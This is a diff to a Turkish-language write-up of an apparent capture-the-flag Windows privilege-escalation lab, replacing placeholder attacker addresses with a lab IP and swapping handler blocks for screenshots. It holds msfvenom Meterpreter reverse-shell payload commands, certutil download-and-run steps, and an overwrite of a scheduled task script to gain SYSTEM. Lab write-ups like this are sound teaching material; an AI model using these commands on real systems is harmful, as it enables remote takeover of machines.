@@ -205,11 +205,12 @@ Dizin normal kullanıcılar tarafından **yazılabilir** durumdaydı. Yani servi
 
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp \
-  LHOST=ATTACKER_IP \
+  LHOST=192.168.154.242 \
   LPORT=4444 \
   -f exe \
   -o svc.exe
 ```
+<img width="740" height="206" alt="reversexe" src="https://github.com/user-attachments/assets/9deadd4e-6199-4714-bdd2-5e574c3c4cd9" />
 
 Sonra basit bir HTTP sunucusu açıp dosyayı hedefe ulaştırdım:
 
@@ -220,20 +221,9 @@ python3 -m http.server 8000
 Hedef üzerinde `certutil` ile payload'ı indirip servisin binary yoluna yerleştirdim:
 
 ```cmd
-certutil -urlcache -split -f http://ATTACKER_IP:8000/svc.exe C:\Windows\THMSvc\reverse.exe
+certutil -urlcache -split -f http://192.168.154.242:8000/svc.exe C:\Windows\THMSvc\reverse.exe
 ```
-
-Ardından Metasploit tarafında bir `multi/handler` açıp servisi yeniden başlattım (ya da makine zaten yeniden başlıyorsa bekledim):
-
-```
-use exploit/multi/handler
-set payload windows/x64/meterpreter/reverse_tcp
-set LHOST ATTACKER_IP
-set LPORT 4444
-run
-```
-
-*(Buraya msfvenom payload üretim çıktısının ve handler'ın bağlantıyı yakaladığı anın ss'i eklenecek)*
+<img width="734" height="179" alt="shellsystem32" src="https://github.com/user-attachments/assets/f37445d3-ebb3-46ac-80cd-a3e64a4382d7" />
 
 Bağlantı geldiğinde artık `svcadmin` yetkisindeydim. Masaüstüne gidip flag'i aldım:
 
@@ -256,9 +246,10 @@ Son adım için `svcadmin` yetkisiyle sistemde tekrar gezinmeye başladım. `C:\
 
 Yine aynı yöntemi izledim — bu sefer payload'ı doğrudan `.bat` dosyası üzerinden tetikleyecektim:
 
+<img width="833" height="349" alt="task" src="https://github.com/user-attachments/assets/d014aa1b-131d-4be2-8a39-2d6c06641e7f" />
+
 ```bash
-# Attacker makinesinde payload üretimi
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.154.242 LPORT=4444 -f exe -o shell.exe
 
 # HTTP sunucusu
 python3 -m http.server 8000
@@ -267,7 +258,7 @@ python3 -m http.server 8000
 Hedef üzerinde payload'ı indirdim:
 
 ```cmd
-certutil -urlcache -f http://ATTACKER_IP:8000/shell.exe C:\Windows\Temp\shell.exe
+certutil -urlcache -f http://192.168.154.242:8000/shell.exe C:\Windows\Temp\shell.exe
 ```
 
 Ve `cleanup.bat` dosyasının içeriğini kendi payload'ımı çalıştıracak şekilde değiştirdim:
@@ -275,20 +266,10 @@ Ve `cleanup.bat` dosyasının içeriğini kendi payload'ımı çalıştıracak �
 ```cmd
 cmd /c "echo C:\Windows\Temp\shell.exe > C:\Windows\Tasks\cleanup.bat"
 ```
+<img width="667" height="201" alt="shellson" src="https://github.com/user-attachments/assets/f2db9ef6-ea94-4875-abd3-d5a58034db91" />
 
-*(Buraya cleanup.bat dosyasının izinlerinin ve üzerine yazma işleminin ss'i eklenecek)*
+Zamanlanmış görev tetiklendiğinde handler tarafında yeni bir bağlantı düştü — bu sefer **SYSTEM** yetkisiyle:
 
-Zamanlanmış görev tetiklendiğinde (ya da manuel çalıştırıldığında), handler tarafında yeni bir bağlantı düştü — bu sefer **SYSTEM** yetkisiyle:
-
-```
-use exploit/multi/handler
-set payload windows/x64/meterpreter/reverse_tcp
-set LHOST ATTACKER_IP
-set LPORT 4444
-run
-```
-
-*(Buraya SYSTEM yetkisiyle gelen meterpreter oturumunun ve `getuid` çıktısının ss'i eklenecek)*
 
 `C:\` dizini altında son flag'i okuyarak zinciri tamamladım:
 
